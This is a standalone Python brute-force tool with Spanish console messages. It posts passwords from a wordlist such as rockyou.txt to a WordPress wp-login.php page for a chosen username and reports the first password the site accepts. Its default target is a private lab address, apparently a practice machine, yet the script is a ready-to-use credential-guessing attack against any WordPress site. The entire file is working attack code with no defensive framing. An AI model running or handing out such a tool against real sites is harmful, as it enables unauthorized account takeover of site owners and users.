
#!/usr/bin/env python

import argparse
import os
import signal
import sys
import time

import requests
from pwn import *


def def_handler(sig, frame):
    print("\n\n[!] Saliendo ....\n\n")
    sys.exit(0)


signal.signal(signal.SIGINT, def_handler)


def get_args():
    p = argparse.ArgumentParser("Hacking Tool")
    p.add_argument("-u", "--user", help="-u admin", required=True)
    p.add_argument(
        "-w", "--wordlist", help="-w /usr/share/wordlists/rockyou.txt", required=True
    )
    p.add_argument(
        "-m", "--main_url", help="-m http://192.168.56.3/wordpress", required=True
    )

    args = p.parse_args()
    return args


def request(main_url, user, password):

    headers = {
        "Host": "192.168.56.3",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "http://192.168.56.3/wordpress/wp-login.php?redirect_to=http%3A%2F%2F192.168.56.3%2Fwordpress%2Fwp-admin%2F&reauth=1",
    }

    cookies = {
        "wp-settings-1": "mfold%3Do",
        "wp-settings-time-1": "1790293700",
        "wordpress_test_cookie": "WP%20Cookie%20check",
    }

    data = {
        "log": user,
        "pwd": "%s" % password,
        "wp-submit": "Log In",
        "redirect_to": "http://192.168.56.3/wordpress/wp-admin/",
        "testcookie": "1",
    }

    try:
        r = requests.post(main_url, headers=headers, data=data, cookies=cookies)

        if "is incorrect" not in r.text:
            print(f"\n[!] Contraseña correcta: {password}")
            exit(0)

    except requests.exceptions.ConnectionError:
        print("[!] Error al conectar con el servidor")


def dicc(pathfile):

    dictionary = []

    with open(pathfile, "r", encoding="utf-8") as f:
        for line in f:
            dictionary.append(line.strip())

    return dictionary


def main():

    args = get_args()
    os.system("clear")
    print("\n\tIniciando Ataque de Fuerza Bruta\n")
    p1 = log.progress("Password")
    dictionary = dicc(args.wordlist)

    for password in dictionary:
        p1.status(password)
        request(args.main_url, args.user, password)
        time.sleep(0.10)


if __name__ == "__main__":
    main()
